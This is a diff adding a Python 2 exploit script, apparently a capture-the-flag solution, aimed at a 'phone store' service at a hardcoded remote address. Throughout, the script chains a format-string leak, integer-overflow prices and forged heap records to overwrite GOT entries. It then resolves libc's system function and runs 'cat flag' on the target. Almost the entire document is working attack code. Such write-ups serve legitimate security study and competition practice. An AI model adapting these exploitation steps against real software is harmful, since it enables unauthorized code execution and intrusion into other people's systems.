@@ -1,0 +1,165 @@
+
+#我是zio
+import socket
+import time
+import struct
+import re
+from zio import *
+
+io = zio(('146.148.60.107', 6666), timeout=888888, print_read=True, print_write=False)
+# io = zio(('10.211.55.5', 4444), timeout=88888, print_read=True, print_write=True)
+
+sprintf_got = l32(0x804b00c)
+atoi_got    = l32(0x804b038)
+store_name  = l32(0x804b2c0)
+leak_dui    = l32(0x804b37c)
+find_1 = 0x804b482
+fack_2 = 0x804b3f8
+
+
+def store_name():
+    io.read_until("choice? ")
+    io.write('a\n') #register
+    io.read_until("store? ")
+    io.write((sprintf_got+"%2$p!%3$p!%4$p!%5$p!%6$p").ljust(0x3f,'A')+'\n')
+
+def add_phone():
+    io.read_until("choice? ")
+    io.write('a\n')
+    io.read_until("name? ")
+    io.write('A'*0x1f+'\n')
+    io.read_until("OS? ")
+    io.write('4\n')
+    io.read_until("price? ")
+    io.write('-2147483447'+'\n')
+    io.read_until("description? ")
+    io.write('B'*0x4f+'\n')
+
+def add_fack_phone():
+    # io.read_until("choice? ")
+    io.write('a\n')
+    # io.read_until("name? ")
+    io.write('A'*0x1f+'\n')
+    # io.read_until("OS? ")
+    io.write('4\n')
+    # io.read_until("price? ")
+    io.write('-1647483549'+'\n')
+    # io.read_until("description? ")
+    #io.write('B'*(0x4f-0xd)+sprintf_got+sprintf_got+sprintf_got+'A\n')
+    io.write(l32(0x804b037)+l32(0x804b034)+'B'*(0x4f-0xd-57-4-4)+l32(0x804b039)+(atoi_got+leak_dui).ljust(53,'\xff')+'\x01'*2+l32(fack_2)+'\x01'*2+l32(0x8049b64)+'\x01\n')
+    io.read_until('fully!')
+    io.read_until('choice? ')
+store_name()
+count = 1
+
+while(count < 16):
+    count = count + 1
+    add_phone()
+
+io.read_until("choice? ")
+io.write('d\n') #return to main
+io.read_until("choice? ")
+io.write('b\n')
+io.read_until("buy? ")
+io.write('15\n')
+io.read_until("choice? ")
+io.write('c\n')
+io.read_until("choice? ")
+io.write('a\n')
+add_fack_phone()
+#raw_input("!!!")
+io.write('c\n')
+io.read_until("choice? ")
+io.write('d\n')  # return to main
+io.read_until("choice? ")
+io.write('b\n')   #try store
+io.read_until("buy? ")
+io.write('16\n')
+io.read_until("choice? ")
+io.write('b\n')
+io.read_until("buy? ")
+#raw_input("fackpoint")
+io.write(str(0x804b2bf)+'\n')  #leack libc_addr
+#print R()
+
+io.read_until("choice? ")
+io.write('c\n')
+io.read_until("choice? ")
+io.write('b\n')   #try store
+temp = io.read_until('buy? ')[:8]
+print '|', temp
+atoi_libc = struct.unpack('I',temp[:4])[0]
+new_libc = struct.unpack('I',temp[4:8])[0]
+print hex(atoi_libc)
+print hex(new_libc)
+#print io.read_until("buy? ")
+
+system = atoi_libc - 0x2d160 + 0x3ada0
+
+print hex(system)
+
+money = system&0x00ffffff
+left_money = ((atoi_libc&0x00ffffff)<<8)+0x90
+
+print money
+print left_money
+sb = left_money-money
+#hehe = (left_money-money)/price
+
+io.write('16\n')  #once more
+io.read_until("choice? ")
+io.write('b\n')
+io.read_until("buy? ")
+io.write(str(0x804b2bb)+'\n')
+io.read_until("choice? ")
+io.write('c\n')
+io.read_until("choice? ")
+io.write('b\n')
+io.read_until('buy? ')
+
+io.write('16\n')
+io.read_until("choice? ")
+io.write('b\n')
+io.read_until("buy? ")
+io.write(str(0x804b400)+'\n')   #make an '1'
+io.read_until("choice? ")
+io.write('b\n')
+io.read_until("buy? ")
+io.write(str(0x804b2bb+0xd)+'\n')   # make a fack point2 --->  price = 1
+io.read_until("choice? ")
+io.write('b\n')
+io.read_until("buy? ")
+io.write(str(0x804b248)+'\n')  #fack price
+io.read_until("choice? ")
+io.write('a\n')
+io.read_until("buy? ")
+io.write('0\n')  #adjust left money
+io.read_until('choice? ')
+#money2 = int(re.findall(': ([0-9]*) CNY',aaa)[0],16)
+#money2 = int(re.findall(': ([0-9a-f]*) ',aaa)[0],10)
+#print hex(money2)
+#print money2
+
+io.write('b\n')
+io.read_until("buy? ")
+io.write(str(0x804b24c)+'\n')  #fack price
+io.read_until("choice? ")
+io.write('c\n')
+io.read_until("choice? ")
+io.write('b\n')
+io.read_until('buy? ')
+#print io.read_until("buy? ")
+io.write('1\n')
+
+io.read_until('choice? ')
+#money3 = int(re.findall(': ([0-9a-f]*) ',aaa)[0],10)
+io.write('a\n')
+io.read_until("buy? ")
+io.write(str(0xdc4000)+'\n')
+io.read_until("choice? ")
+io.write('a\n')
+io.read_until("buy? ")
+io.write('cat flag\x00'+'\n')
+# print io.readline()
+
+print io.readline()
